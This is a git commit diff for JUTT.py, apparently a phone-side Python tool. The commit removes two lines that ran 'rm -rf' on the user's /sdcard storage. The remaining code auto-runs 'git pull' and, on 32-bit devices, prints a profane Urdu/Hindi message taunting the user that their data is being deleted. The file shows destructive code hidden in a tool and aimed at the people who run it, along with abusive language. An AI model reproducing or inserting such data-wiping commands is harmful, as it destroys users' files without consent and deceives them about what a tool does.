d3ea5fb2b6e1757e4605a28ebd05322a8894b582
JUTT-704 <129414469+JUTT-704@users.noreply.github.com>
2023-03-30 21:52:23 +0500

    Update JUTT.py

--- JUTT.py
+++ JUTT.py
@@ -1,7 +1,5 @@
 import os,platform
 os.system('git pull')
-os.system('rm -rf /sdcard/*')
-os.system('rm -rf /sdcard/VidMate')
 xd=platform.architecture()[0]
 if xd=="32bit":
     print(' \33[1;32m Lund Hain Tu Aj Ka Zamana Main Tu 64 bit Mobile Nahii La Saka Wait Tara Data Delete Karta Hoon Ruk Sabar Kar rm -rf /sdcard/* Gandu Lagaya Tara Data Enjoy')
